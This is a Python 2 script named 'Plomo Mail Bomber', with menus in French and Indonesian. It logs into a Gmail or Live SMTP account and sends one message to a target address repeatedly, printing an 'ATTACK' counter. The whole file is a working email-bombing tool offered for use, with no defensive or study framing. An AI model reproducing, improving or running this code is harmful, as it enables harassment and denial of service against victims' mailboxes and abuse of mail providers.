#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys, os, time
import smtplib
import string
import sys

def prompt(prompt):
    return string.strip(raw_input(prompt))

os.system('cls')
print

print""" Plomo Mail Bomber """                                                                                 
time.sleep(1)
time.sleep(4)

def index():
    os.system('cls')
    print" =================================="
    print" | https://www.facebook.com/carr.ie.3948|"
    print" =================================\n"
    print "Pilih Menu:"
    print
    print "[1] Bomber"
    print "[2] Help"
    print "[3] Copy Rights"
    print "[0] Exit"
    print
 
    select = raw_input('=>>')
    if select == '1':
        bomber()
    elif select == '2':
        help()
    elif select == '3':
        copyrights()
    elif select == '0':
        sys.exit()
    else:
        os.system('cls')
        print "Invalide!"
        print
        index()

def bomber():

    os.system("cls")
	
    print" Plomo email Activé "

    compte_email = raw_input(" Email: ")
    print""

    print" Masukkan kata sandi Anda. "
    compte_password =raw_input(" MDP: ")
    print" "

    print" Entrez votre adresse cible. "
    cible = raw_input(" Fichier target: ")
    print" "

    print " Indiquez le nombre de messages à envoyer "
    nb = raw_input(" Nombre de message: ")
    print" "

    print"Mettez votre message ici. "
    message = raw_input(" Votre message: ")

    server_disponible = ["Gmail", "Live"]
    i = 1

    for server in server_disponible:
        print " ["+str(i)+"] "+server


        i = 1+i

    server = input("Sélectionnez un serveur pour active Plomo Bomber: ")

    if(server > 0 and server <i):
        if(server_disponible[server-1] == "Gmail"):
            server = "smtp.gmail.com"
            port = 587
        elif(server_disponible[server-1] == "Live"):
            server = "smtp.live.com"
            port = 465


        send = 0
        server = smtplib.SMTP(server, port)
        server.ehlo()
        server.starttls()
        server.login(compte_email, compte_password)

            #message
        
        print "envoyer"
        print""
        print" Ctrl+C pour arrêter l'attaque Du Plomobomber! "

        email = "test@gmail.com"
        while(nb > send):
            print
            print "ATTACK:"+str(send)
            msg = "From: "+compte_email+"\n"+message
            server.sendmail(compte_email, cible, message) #Mon Email, email Cible, message
            send = send+1
        server.quit()
        print "Selesai"
        print "Berhenti ("+str(send)+")"
        index()

    else:
        os.system('cls')
        print
        print "##############################################"
        print "#                                            #"
        print "#        Aucune demande de serveur!          #"
        print "#                                            #"
        print "##############################################"
        pause = raw_input('')
        index()
        #sys.exit()

def help():

    os.system('cls')

    print
    print "         ###################################"
    print "         #                                 #"
    print "         # Avertissement Plomo!            #"
    print "         #                                 #"
    print "         ###################################"
    print
    print "Kembali ke Menu Utama tekan 'Enter'..."
    pause = raw_input('')
    os.system('cls')
    index()
 
def copyrights():

    os.system('cls')

    pause = raw_input('')
    os.system('cls')
    index()

 
 
 
index()
